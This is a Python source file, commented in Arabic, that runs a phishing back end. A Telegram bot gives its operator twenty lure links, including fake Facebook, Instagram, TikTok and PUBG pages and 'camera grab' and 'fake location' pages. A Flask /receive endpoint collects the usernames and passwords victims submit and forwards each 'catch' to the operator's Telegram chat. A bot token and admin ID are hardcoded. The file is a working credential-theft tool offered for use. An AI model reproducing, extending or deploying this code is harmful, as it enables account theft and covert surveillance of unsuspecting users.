import os
import telebot
from flask import Flask, request, jsonify
from flask_cors import CORS

# --- إعدادات الجنرال ---
TOKEN = '7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM'
ADMIN_ID = 6829017835
MY_TITLE = "الجنرال"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
CORS(app) # للسماح بالاتصال من صفحات الـ HTML الخارجية

# --- دالة إنشاء لوحة التحكم (20 زر) ---
def get_general_dashboard():
    kb = telebot.types.InlineKeyboardMarkup(row_width=2) # عرض زرين في كل صف
    
    # قائمة بـ 20 مسمى احترافي كما طلبت
    buttons = [
        ("🔹 فيسبوك (أصلي)", "fb_orig"), ("🔸 إنستغرام (هدية)", "ig_gift"),
        ("🔹 تيك توك (عملات)", "tk_coins"), ("🔸 سناب شات (سنابات)", "snap_gift"),
        ("🔹 ببجي (6000 UC)", "pubg_uc"), ("🔸 فري فاير (جواهر)", "ff_diam"),
        ("🔹 واتساب (تحديث)", "wa_update"), ("🔸 تلغرام (بريميوم)", "tg_prem"),
        ("🔹 كلاش أوف كلانس", "coc_gems"), ("🔸 لودو ستار (ذهب)", "ludo_gold"),
        ("🔹 نمط اختراق موقع", "tool_loc"), ("🔸 نمط سحب كاميرا", "tool_cam"),
        ("🔹 فيسبوك (لايت)", "fb_lite"), ("🔸 إنستغرام (توثيق)", "ig_verify"),
        ("🔹 تيك توك (متابعين)", "tk_fans"), ("🔸 تويتر / X", "x_login"),
        ("🔹 نتفليكس (مجاني)", "ntfx_acc"), ("🔸 سبوتيفاي (اشتراك)", "spot_prem"),
        ("🔹 طلب موقع (تمويه)", "fake_map"), ("🔸 فحص أمان (تمويه)", "sec_check")
    ]
    
    btns = [telebot.types.InlineKeyboardButton(text=name, callback_data=f"link_{code}") for name, code in buttons]
    kb.add(*btns)
    return kb

# --- استقبال الصيد من الصفحات ---
@app.route('/receive', methods=['POST'])
def receive_data():
    data = request.json
    platform = data.get('platform', 'غير معروف')
    user = data.get('u') or data.get('username')
    password = data.get('p') or data.get('password')
    
    if user and password:
        msg = f"🎖️ **صيد جديد للجنرال** 🎖️\n"
        msg += f"------------------------\n"
        msg += f"🌐 المنصة: {platform}\n"
        msg += f"👤 المستخدم: `{user}`\n"
        msg += f"🔑 كلمة السر: `{password}`\n"
        msg += f"------------------------"
        bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error"}), 400

# --- أوامر البوت ---
@bot.message_handler(commands=['start'])
def welcome(m):
    if m.from_user.id == ADMIN_ID:
        welcome_text = f"🎖️ أهلاً بك يا {MY_TITLE} في مركز العمليات\n\n"
        welcome_text += "لقد تم تجهيز الـ 20 قسماً المطلوبة.\n"
        welcome_text += "اضغط على أي قسم لجلب رابط الهجوم الخاص به:"
        bot.send_message(m.chat.id, welcome_text, reply_markup=get_general_dashboard())

@bot.callback_query_handler(func=lambda c: c.data.startswith("link_"))
def handle_links(c):
    page_type = c.data.replace("link_", "")
    # هنا تضع رابط المستودع الثاني (الذي سترفع عليه صفحات الـ HTML)
    # ملاحظة: يجب أن تكون الصفحات مسمية بنفس "code" الزر (مثلاً: fb_orig.html)
    pages_host = "https://your-pages-repo.github.io" # استبدله برابط صفحاتك
    final_link = f"{pages_host}/{page_type}.html"
    
    bot.send_message(c.message.chat.id, f"🔗 الرابط الجاهز للقسم ({page_type}):\n`{final_link}`", parse_mode='Markdown')

if __name__ == "__main__":
    # تشغيل البوت في خلفية السيرفر
    import threading
    threading.Thread(target=bot.infinity_polling).start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
